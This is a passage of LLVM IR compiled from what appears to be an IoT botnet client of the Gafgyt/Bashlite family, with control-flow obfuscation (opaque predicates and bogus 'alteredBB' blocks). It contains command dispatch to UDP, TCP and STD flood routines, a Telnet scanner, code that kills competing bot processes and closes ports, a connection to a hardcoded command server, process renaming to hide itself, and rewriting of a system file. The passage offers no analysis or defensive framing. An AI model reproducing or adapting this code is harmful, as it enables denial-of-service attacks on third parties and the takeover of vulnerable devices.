  %980 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %980, i8** %29, align 8
  br label %953

; <label>:981:                                    ; preds = %originalBBpart2128
  br label %990

; <label>:982:                                    ; preds = %originalBBpart2120
  %983 = call i32 @listFork()
  %984 = icmp ne i32 %983, 0
  br i1 %984, label %985, label %986

; <label>:985:                                    ; preds = %982
  br label %1121

; <label>:986:                                    ; preds = %982
  %987 = load i8*, i8** %26, align 8
  %988 = load i32, i32* %27, align 4
  %989 = load i32, i32* %28, align 4
  call void @SendSTD(i8* %987, i32 %988, i32 %989)
  call void @_exit(i32 0) #11
  unreachable

; <label>:990:                                    ; preds = %981
  %991 = load i32, i32* @x.87
  %992 = load i32, i32* @y.88
  %993 = sub i32 %991, 1
  %994 = mul i32 %991, %993
  %995 = urem i32 %994, 2
  %996 = icmp eq i32 %995, 0
  %997 = icmp slt i32 %992, 10
  %998 = or i1 %996, %997
  br i1 %998, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %990
  %999 = load i32, i32* @x.87
  %1000 = load i32, i32* @y.88
  %1001 = sub i32 %999, 1
  %1002 = mul i32 %999, %1001
  %1003 = urem i32 %1002, 2
  %1004 = icmp eq i32 %1003, 0
  %1005 = icmp slt i32 %1000, 10
  %1006 = or i1 %1004, %1005
  br i1 %1006, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br label %1007

; <label>:1007:                                   ; preds = %originalBBpart2132, %865
  %1008 = load i8**, i8*** %4, align 8
  %1009 = getelementptr inbounds i8*, i8** %1008, i64 0
  %1010 = load i8*, i8** %1009, align 8
  %1011 = call i32 @strcmp(i8* %1010, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.316, i32 0, i32 0)) #9
  %1012 = icmp ne i32 %1011, 0
  br i1 %1012, label %1014, label %1013

; <label>:1013:                                   ; preds = %1007
  call void @bot_killer()
  call void @port_closer()
  br label %1014

; <label>:1014:                                   ; preds = %1013, %1007
  %1015 = load i8**, i8*** %4, align 8
  %1016 = getelementptr inbounds i8*, i8** %1015, i64 0
  %1017 = load i8*, i8** %1016, align 8
  %1018 = call i32 @strcmp(i8* %1017, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.317, i32 0, i32 0)) #9
  %1019 = icmp ne i32 %1018, 0
  br i1 %1019, label %1104, label %1020

; <label>:1020:                                   ; preds = %1014
  store i32 0, i32* %30, align 4
  store i64 0, i64* %31, align 8
  br label %1021

; <label>:1021:                                   ; preds = %1079, %1020
  %1022 = load i32, i32* @x.87
  %1023 = load i32, i32* @y.88
  %1024 = sub i32 %1022, 1
  %1025 = mul i32 %1022, %1024
  %1026 = urem i32 %1025, 2
  %1027 = icmp eq i32 %1026, 0
  %1028 = icmp slt i32 %1023, 10
  %1029 = or i1 %1027, %1028
  br i1 %1029, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1021
  %1030 = load i64, i64* %31, align 8
  %1031 = load i64, i64* @numpids, align 8
  %1032 = icmp ult i64 %1030, %1031
  %1033 = load i32, i32* @x.87
  %1034 = load i32, i32* @y.88
  %1035 = sub i32 %1033, 1
  %1036 = mul i32 %1033, %1035
  %1037 = urem i32 %1036, 2
  %1038 = icmp eq i32 %1037, 0
  %1039 = icmp slt i32 %1034, 10
  %1040 = or i1 %1038, %1039
  br i1 %1040, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br i1 %1032, label %1041, label %1082

; <label>:1041:                                   ; preds = %originalBBpart2136
  %1042 = load i32, i32* @x.87
  %1043 = load i32, i32* @y.88
  %1044 = sub i32 %1042, 1
  %1045 = mul i32 %1042, %1044
  %1046 = urem i32 %1045, 2
  %1047 = icmp eq i32 %1046, 0
  %1048 = icmp slt i32 %1043, 10
  %1049 = or i1 %1047, %1048
  br i1 %1049, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1041
  %1050 = load i32*, i32** @pids, align 8
  %1051 = load i64, i64* %31, align 8
  %1052 = getelementptr inbounds i32, i32* %1050, i64 %1051
  %1053 = load i32, i32* %1052, align 4
  %1054 = icmp ne i32 %1053, 0
  %1055 = load i32, i32* @x.87
  %1056 = load i32, i32* @y.88
  %1057 = sub i32 %1055, 1
  %1058 = mul i32 %1055, %1057
  %1059 = urem i32 %1058, 2
  %1060 = icmp eq i32 %1059, 0
  %1061 = icmp slt i32 %1056, 10
  %1062 = or i1 %1060, %1061
  br i1 %1062, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br i1 %1054, label %1063, label %1078

; <label>:1063:                                   ; preds = %originalBBpart2140
  %1064 = load i32*, i32** @pids, align 8
  %1065 = load i64, i64* %31, align 8
  %1066 = getelementptr inbounds i32, i32* %1064, i64 %1065
  %1067 = load i32, i32* %1066, align 4
  %1068 = call i32 @getpid() #5
  %1069 = icmp ne i32 %1067, %1068
  br i1 %1069, label %1070, label %1078

; <label>:1070:                                   ; preds = %1063
  %1071 = load i32*, i32** @pids, align 8
  %1072 = load i64, i64* %31, align 8
  %1073 = getelementptr inbounds i32, i32* %1071, i64 %1072
  %1074 = load i32, i32* %1073, align 4
  %1075 = call i32 @kill(i32 %1074, i32 9) #5
  %1076 = load i32, i32* %30, align 4
  %1077 = add nsw i32 %1076, 1
  store i32 %1077, i32* %30, align 4
  br label %1078

; <label>:1078:                                   ; preds = %1070, %1063, %originalBBpart2140
  br label %1079

; <label>:1079:                                   ; preds = %1078
  %1080 = load i64, i64* %31, align 8
  %1081 = add i64 %1080, 1
  store i64 %1081, i64* %31, align 8
  br label %1021

; <label>:1082:                                   ; preds = %originalBBpart2136
  %1083 = load i32, i32* %30, align 4
  %1084 = icmp sgt i32 %1083, 0
  br i1 %1084, label %1085, label %1086

; <label>:1085:                                   ; preds = %1082
  br label %1087

; <label>:1086:                                   ; preds = %1082
  br label %1087

; <label>:1087:                                   ; preds = %1086, %1085
  %1088 = load i32, i32* @x.87
  %1089 = load i32, i32* @y.88
  %1090 = sub i32 %1088, 1
  %1091 = mul i32 %1088, %1090
  %1092 = urem i32 %1091, 2
  %1093 = icmp eq i32 %1092, 0
  %1094 = icmp slt i32 %1089, 10
  %1095 = or i1 %1093, %1094
  br i1 %1095, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1087
  %1096 = load i32, i32* @x.87
  %1097 = load i32, i32* @y.88
  %1098 = sub i32 %1096, 1
  %1099 = mul i32 %1096, %1098
  %1100 = urem i32 %1099, 2
  %1101 = icmp eq i32 %1100, 0
  %1102 = icmp slt i32 %1097, 10
  %1103 = or i1 %1101, %1102
  br i1 %1103, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br label %1104

; <label>:1104:                                   ; preds = %originalBBpart2144, %1014
  %1105 = load i8**, i8*** %4, align 8
  %1106 = getelementptr inbounds i8*, i8** %1105, i64 0
  %1107 = load i8*, i8** %1106, align 8
  %1108 = call i32 @strcmp(i8* %1107, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.318, i32 0, i32 0)) #9
  %1109 = icmp ne i32 %1108, 0
  br i1 %1109, label %1111, label %1110

; <label>:1110:                                   ; preds = %1104
  call void @exit(i32 0) #12
  unreachable

; <label>:1111:                                   ; preds = %1104
  %1112 = load i8**, i8*** %4, align 8
  %1113 = getelementptr inbounds i8*, i8** %1112, i64 0
  %1114 = load i8*, i8** %1113, align 8
  %1115 = call i32 @strcmp(i8* %1114, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.319, i32 0, i32 0)) #9
  %1116 = icmp ne i32 %1115, 0
  br i1 %1116, label %1121, label %1117

; <label>:1117:                                   ; preds = %1111
  call void @RemoveTempDirs()
  %1118 = load i32, i32* @mainCommSock, align 4
  %1119 = call i8* @getBuild()
  %1120 = call i32 (i32, i8*, ...) @sockprintf(i32 %1118, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.320, i32 0, i32 0), i8* %1119)
  br label %1121

; <label>:1121:                                   ; preds = %1117, %1111, %985, %902, %823, %681, %569, %437, %originalBBpart240, %originalBBpart236, %264, %229, %originalBBpart220, %originalBBpart28, %96, %37
  %1122 = load i32, i32* @x.87
  %1123 = load i32, i32* @y.88
  %1124 = sub i32 %1122, 1
  %1125 = mul i32 %1122, %1124
  %1126 = urem i32 %1125, 2
  %1127 = icmp eq i32 %1126, 0
  %1128 = icmp slt i32 %1123, 10
  %1129 = or i1 %1127, %1128
  br i1 %1129, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1121
  %1130 = load i32, i32* @x.87
  %1131 = load i32, i32* @y.88
  %1132 = sub i32 %1130, 1
  %1133 = mul i32 %1130, %1132
  %1134 = urem i32 %1133, 2
  %1135 = icmp eq i32 %1134, 0
  %1136 = icmp slt i32 %1131, 10
  %1137 = or i1 %1135, %1136
  br i1 %1137, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %38
  %1138 = load i8**, i8*** %4, align 8
  %1139 = getelementptr inbounds i8*, i8** %1138, i64 0
  %1140 = load i8*, i8** %1139, align 8
  %1141 = call i32 @strcmp(i8* %1140, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.306, i32 0, i32 0)) #9
  %1142 = icmp ne i32 %1141, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %76
  store i32 1000, i32* %8, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %101
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %118
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %159
  %1143 = load i8**, i8*** %4, align 8
  %1144 = getelementptr inbounds i8*, i8** %1143, i64 1
  %1145 = load i8*, i8** %1144, align 8
  %1146 = call i32 @strcmp(i8* %1145, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.308, i32 0, i32 0)) #9
  %1147 = icmp ne i32 %1146, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %184
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %201
  %1148 = load i32, i32* @scanPid, align 4
  %1149 = call i32 @kill(i32 %1148, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %243
  %1150 = load i32, i32* @mainCommSock, align 4
  %1151 = call i32 (i32, i8*, ...) @sockprintf(i32 %1150, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.311, i32 0, i32 0))
  %1152 = load i32, i32* %10, align 4
  %1153 = load i32, i32* %9, align 4
  call void @TelnetScanner(i32 %1152, i32 %1153)
  call void @_exit(i32 0) #11
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %265
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %303
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %323
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %369
  %1154 = load i32, i32* %3, align 4
  %1155 = icmp slt i32 %1154, 6
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %400
  %1156 = load i8**, i8*** %4, align 8
  %1157 = getelementptr inbounds i8*, i8** %1156, i64 4
  %1158 = load i8*, i8** %1157, align 8
  %1159 = call i32 @atoi(i8* %1158) #9
  %1160 = icmp eq i32 %1159, -1
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %461
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %489
  %1161 = call i32 @listFork()
  %1162 = icmp ne i32 %1161, 0
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %508
  %1163 = load i8*, i8** %17, align 8
  %1164 = load i32, i32* %12, align 4
  %1165 = load i32, i32* %13, align 4
  %1166 = load i32, i32* %14, align 4
  %1167 = load i32, i32* %15, align 4
  %1168 = load i32, i32* %16, align 4
  call void @SendUDP(i8* %1163, i32 %1164, i32 %1165, i32 %1166, i32 %1167, i32 %1168)
  call void @_exit(i32 0) #11
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %533
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %550
  %1169 = call i32 @listFork()
  %1170 = icmp ne i32 %1169, 0
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %570
  %1171 = load i8*, i8** %11, align 8
  %1172 = load i32, i32* %12, align 4
  %1173 = load i32, i32* %13, align 4
  %1174 = load i32, i32* %14, align 4
  %1175 = load i32, i32* %15, align 4
  %1176 = load i32, i32* %16, align 4
  call void @SendUDP(i8* %1171, i32 %1172, i32 %1173, i32 %1174, i32 %1175, i32 %1176)
  call void @_exit(i32 0) #11
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %615
  %1177 = load i32, i32* %3, align 4
  %1178 = icmp sgt i32 %1177, 5
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %634
  %1179 = load i8**, i8*** %4, align 8
  %1180 = getelementptr inbounds i8*, i8** %1179, i64 5
  %1181 = load i8*, i8** %1180, align 8
  %1182 = call i32 @atoi(i8* %1181) #9
  %1183 = icmp slt i32 %1182, 0
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %659
  %1184 = load i8**, i8*** %4, align 8
  %1185 = getelementptr inbounds i8*, i8** %1184, i64 6
  %1186 = load i8*, i8** %1185, align 8
  %1187 = call i32 @atoi(i8* %1186) #9
  %1188 = icmp slt i32 %1187, 1
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %704
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %721
  store i32 %722, i32* %22, align 4
  %1189 = load i32, i32* %3, align 4
  %1190 = icmp sgt i32 %1189, 5
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %741
  %1191 = load i8**, i8*** %4, align 8
  %1192 = getelementptr inbounds i8*, i8** %1191, i64 5
  %1193 = load i8*, i8** %1192, align 8
  %1194 = call i32 @atoi(i8* %1193) #9
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %763
  store i32 %764, i32* %23, align 4
  store i32 32, i32* %24, align 4
  %1195 = load i8*, i8** %18, align 8
  %1196 = call i8* @strstr(i8* %1195, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #9
  %1197 = icmp ne i8* %1196, null
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %790
  %1198 = call i32 @listFork()
  %1199 = icmp ne i32 %1198, 0
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %824
  %1200 = load i8*, i8** %18, align 8
  %1201 = load i32, i32* %19, align 4
  %1202 = load i32, i32* %20, align 4
  %1203 = load i8*, i8** %21, align 8
  %1204 = load i32, i32* %23, align 4
  %1205 = load i32, i32* %22, align 4
  %1206 = load i32, i32* %24, align 4
  call void @SendTCP(i8* %1200, i32 %1201, i32 %1202, i8* %1203, i32 %1204, i32 %1205, i32 %1206)
  call void @_exit(i32 0) #11
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %848
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %880
  %1207 = load i8**, i8*** %4, align 8
  %1208 = getelementptr inbounds i8*, i8** %1207, i64 3
  %1209 = load i8*, i8** %1208, align 8
  %1210 = call i32 @atoi(i8* %1209) #9
  %1211 = icmp slt i32 %1210, 1
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %903
  %1212 = load i8**, i8*** %4, align 8
  %1213 = getelementptr inbounds i8*, i8** %1212, i64 1
  %1214 = load i8*, i8** %1213, align 8
  store i8* %1214, i8** %26, align 8
  %1215 = load i8**, i8*** %4, align 8
  %1216 = getelementptr inbounds i8*, i8** %1215, i64 2
  %1217 = load i8*, i8** %1216, align 8
  %1218 = call i32 @atoi(i8* %1217) #9
  store i32 %1218, i32* %27, align 4
  %1219 = load i8**, i8*** %4, align 8
  %1220 = getelementptr inbounds i8*, i8** %1219, i64 3
  %1221 = load i8*, i8** %1220, align 8
  %1222 = call i32 @atoi(i8* %1221) #9
  store i32 %1222, i32* %28, align 4
  %1223 = load i8*, i8** %26, align 8
  %1224 = call i8* @strstr(i8* %1223, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #9
  %1225 = icmp ne i8* %1224, null
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %934
  %1226 = load i8*, i8** %26, align 8
  %1227 = call i8* @strtok(i8* %1226, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %1227, i8** %29, align 8
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %953
  %1228 = load i8*, i8** %29, align 8
  %1229 = icmp ne i8* %1228, null
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %990
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1021
  %1230 = load i64, i64* %31, align 8
  %1231 = load i64, i64* @numpids, align 8
  %1232 = icmp ult i64 %1230, %1231
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1041
  %1233 = load i32*, i32** @pids, align 8
  %1234 = load i64, i64* %31, align 8
  %1235 = getelementptr inbounds i32, i32* %1233, i64 %1234
  %1236 = load i32, i32* %1235, align 4
  %1237 = icmp ne i32 %1236, 0
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1087
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1121
  br label %originalBB146
}

; Function Attrs: nounwind
declare i64 @sysconf(i32) #1

; Function Attrs: nounwind
declare i32 @getpid() #1

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %3, i8 0, i64 512, i32 16, i1 false)
  %4 = load i32, i32* @mainCommSock, align 4
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %6, label %9

; <label>:6:                                      ; preds = %0
  %7 = load i32, i32* @mainCommSock, align 4
  %8 = call i32 @close(i32 %7)
  store i32 0, i32* @mainCommSock, align 4
  br label %9

; <label>:9:                                      ; preds = %6, %0
  %10 = load i32, i32* @currentServer, align 4
  %11 = add nsw i32 %10, 1
  %12 = sext i32 %11 to i64
  %13 = icmp eq i64 %12, 1
  br i1 %13, label %14, label %31

; <label>:14:                                     ; preds = %9
  %15 = load i32, i32* @x.89
  %16 = load i32, i32* @y.90
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  store i32 0, i32* @currentServer, align 4
  %23 = load i32, i32* @x.89
  %24 = load i32, i32* @y.90
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:31:                                     ; preds = %9
  %32 = load i32, i32* @currentServer, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* @currentServer, align 4
  br label %34

; <label>:34:                                     ; preds = %31, %originalBBpart2
  %35 = load i32, i32* @x.89
  %36 = load i32, i32* @y.90
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %34
  %43 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %44 = load i32, i32* @currentServer, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %45
  %47 = load i8*, i8** %46, align 8
  %48 = call i8* @strcpy(i8* %43, i8* %47) #5
  %49 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %49, i32* @mainCommSock, align 4
  %50 = load i32, i32* @mainCommSock, align 4
  %51 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %52 = load i32, i32* @port, align 4
  %53 = call i32 @connectTimeout(i32 %50, i8* %51, i32 %52, i32 30)
  %54 = icmp ne i32 %53, 0
  %55 = load i32, i32* @x.89
  %56 = load i32, i32* @y.90
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %54, label %80, label %63

; <label>:63:                                     ; preds = %originalBBpart24
  %64 = load i32, i32* @x.89
  %65 = load i32, i32* @y.90
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %63
  store i32 1, i32* %1, align 4
  %72 = load i32, i32* @x.89
  %73 = load i32, i32* @y.90
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %97

; <label>:80:                                     ; preds = %originalBBpart24
  %81 = load i32, i32* @x.89
  %82 = load i32, i32* @y.90
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %80
  store i32 0, i32* %1, align 4
  %89 = load i32, i32* @x.89
  %90 = load i32, i32* @y.90
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %97

; <label>:97:                                     ; preds = %originalBBpart212, %originalBBpart28
  %98 = load i32, i32* @x.89
  %99 = load i32, i32* @y.90
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %97
  %106 = load i32, i32* %1, align 4
  %107 = load i32, i32* @x.89
  %108 = load i32, i32* @y.90
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  ret i32 %106

originalBBalteredBB:                              ; preds = %originalBB, %14
  store i32 0, i32* @currentServer, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %34
  %115 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %116 = load i32, i32* @currentServer, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %117
  %119 = load i8*, i8** %118, align 8
  %120 = call i8* @strcpy(i8* %115, i8* %119) #5
  %121 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %121, i32* @mainCommSock, align 4
  %122 = load i32, i32* @mainCommSock, align 4
  %123 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %124 = load i32, i32* @port, align 4
  %125 = call i32 @connectTimeout(i32 %122, i8* %123, i32 %124, i32 30)
  %126 = icmp ne i32 %125, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %63
  store i32 1, i32* %1, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %80
  store i32 0, i32* %1, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %97
  %127 = load i32, i32* %1, align 4
  br label %originalBB14
}

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() #0 {
  %1 = alloca i16, align 2
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.321, i32 0, i32 0), i32 513)
  %5 = trunc i32 %4 to i16
  store i16 %5, i16* %1, align 2
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.321, i32 0, i32 0), i32 0) #5
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %16

; <label>:8:                                      ; preds = %0
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.322, i32 0, i32 0), i8** %2, align 8
  %9 = load i8*, i8** %2, align 8
  %10 = call i64 @strlen(i8* %9) #9
  store i64 %10, i64* %3, align 8
  %11 = load i16, i16* %1, align 2
  %12 = zext i16 %11 to i32
  %13 = load i8*, i8** %2, align 8
  %14 = load i64, i64* %3, align 8
  %15 = call i64 @write(i32 %12, i8* %13, i64 %14)
  br label %17

; <label>:16:                                     ; preds = %0
  br label %21

; <label>:17:                                     ; preds = %8
  %18 = load i16, i16* %1, align 2
  %19 = zext i16 %18 to i32
  %20 = call i32 @close(i32 %19)
  br label %21

; <label>:21:                                     ; preds = %17, %16
  ret void
}

declare i32 @open(i8*, i32, ...) #2

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [10 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.40, i32 0, i32 0), i8** %6, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strlen(i8* %28) #9
  %30 = call i8* @strncpy(i8* %25, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.40, i32 0, i32 0), i64 %29) #5
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.40, i32 0, i32 0), i8** %32, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = ptrtoint i8* %33 to i64
  %35 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %34, i32 0, i32 0, i32 0)
  %36 = call i64 @time(i64* null) #5
  %37 = call i32 @getpid() #5
  %38 = sext i32 %37 to i64
  %39 = xor i64 %36, %38
  %40 = trunc i64 %39 to i32
  call void @srand(i32 %40) #5
  %41 = call i64 @time(i64* null) #5
  %42 = call i32 @getpid() #5
  %43 = sext i32 %42 to i64
  %44 = xor i64 %41, %43
  %45 = trunc i64 %44 to i32
  call void @init_rand(i32 %45)
  %46 = call i32 @fork() #5
  store i32 %46, i32* %7, align 4
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %48, label %51

; <label>:48:                                     ; preds = %2
  %49 = load i32, i32* %7, align 4
  %50 = call i32 @waitpid(i32 %49, i32* %9, i32 0)
  call void @exit(i32 0) #12
  unreachable

; <label>:51:                                     ; preds = %2
  %52 = load i32, i32* %7, align 4
